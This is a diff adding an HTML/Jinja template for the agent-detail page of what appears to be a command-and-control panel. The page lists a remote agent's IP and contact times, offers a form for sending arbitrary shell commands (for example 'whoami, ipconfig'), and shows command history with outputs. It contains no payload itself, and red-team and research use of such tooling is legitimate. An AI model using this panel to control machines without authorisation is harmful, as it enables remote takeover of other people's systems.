@@ -1,0 +1,98 @@
+{% extends "c2_base.html" %}
+
+{% block c2_content %}
+  <div class="card">
+    <div class="card-header">
+      <h3>Agent Details: <code>{{ agent_id }}</code></h3>
+    </div>
+    <div class="card-body">
+      {% if agent_info and not agent_info.error %}
+        <div class="row">
+          <div class="col-md-6">
+            <h4>Agent Information</h4>
+            <p><strong>Agent ID:</strong> {{ agent_info.agent_id }}</p>
+            <p><strong>Remote IP:</strong> {{ agent_info.remote_ip }}</p>
+            <p><strong>First Seen:</strong> {{ agent_info.first_seen | datetimeformat }}</p>
+            <p><strong>Last Seen:</strong> {{ agent_info.last_seen | datetimeformat }}</p>
+            <p><strong>Initial Data:</strong></p>
+            <pre class="bg-light p-2 rounded"><code>{{ agent_info.initial_data | tojson(indent=2) if agent_info.initial_data else 'N/A' }}</code></pre>
+          </div>
+
+          <div class="col-md-6">
+            <h4>Send Command</h4>
+            <form method="POST" action="{{ url_for('c2.agent_detail', agent_id=agent_id) }}">
+              <div class="form-group">
+                <label for="command">Command:</label>
+                <input type="text" name="command" id="command" class="form-control" required placeholder="e.g., whoami, ipconfig">
+              </div>
+              <button type="submit" class="btn btn-primary mt-2">
+                <i class="fas fa-paper-plane"></i> Send Command
+              </button>
+            </form>
+          </div>
+        </div>
+
+        <hr class="my-4">
+
+        <h4>Command History & Outputs</h4>
+        {% if agent_info.command_history and agent_info.command_history | length > 0 %}
+          <div class="table-responsive">
+            <table class="table table-sm table-striped">
+              <thead class="thead-light">
+                <tr>
+                  <th>#</th>
+                  <th>Command ID</th>
+                  <th>Sent At</th>
+                  <th>Command</th>
+                  <th>Status</th>
+                  <th>Completed At</th>
+                  <th>Output</th>
+                </tr>
+              </thead>
+              <tbody>
+              {# Iterate in reverse to show newest first, or sort in Python view and pass sorted #}
+              {% for cmd_entry in agent_info.command_history | sort(attribute='sent_at', reverse=True) %}
+                <tr>
+                  <td>{{ loop.index }}</td>
+                  <td><code>{{ cmd_entry.id[:8] }}...</code></td>
+                  <td>{{ cmd_entry.sent_at | datetimeformat }}</td>
+                  <td><pre><code>{{ cmd_entry.command }}</code></pre></td>
+                  <td>
+                    <span class="badge 
+                      {% if cmd_entry.status == 'sent' %}badge-info{% elif cmd_entry.status == 'executed' %}badge-success{% else %}badge-secondary{% endif %}">
+                      {{ cmd_entry.status | capitalize }}
+                    </span>
+                  </td>
+                  <td>{{ cmd_entry.completed_at | datetimeformat if cmd_entry.completed_at else 'N/A' }}</td>
+                  <td><pre class="bg-light p-1 rounded output-field"><code>{{ cmd_entry.output if cmd_entry.output is not none else ('Pending...' if cmd_entry.status == 'sent' else 'No output') }}</code></pre></td>
+                </tr>
+              {% endfor %}
+              </tbody>
+            </table>
+          </div>
+        {% else %}
+          <p class="text-muted">No commands have been sent to this agent yet, or history is unavailable.</p>
+        {% endif %}
+      {% elif agent_info and agent_info.error %}
+         <div class="alert alert-danger" role="alert">
+            Error retrieving agent details: {{ agent_info.error }}
+         </div>
+      {% else %}
+        <div class="alert alert-warning" role="alert">
+          Agent details are currently unavailable.
+        </div>
+      {% endif %}
+      <a href="{{ url_for('c2.agents') }}" class="btn btn-secondary mt-4">
+        <i class="fas fa-arrow-left"></i> Back to Agents List
+      </a>
+    </div>
+  </div>
+<style>
+  .output-field {
+    max-height: 150px;
+    overflow-y: auto;
+    white-space: pre-wrap; /* Ensures long lines wrap */
+    word-break: break-all; /* Breaks long words/strings */
+  }
+</style>
+{% endblock %}
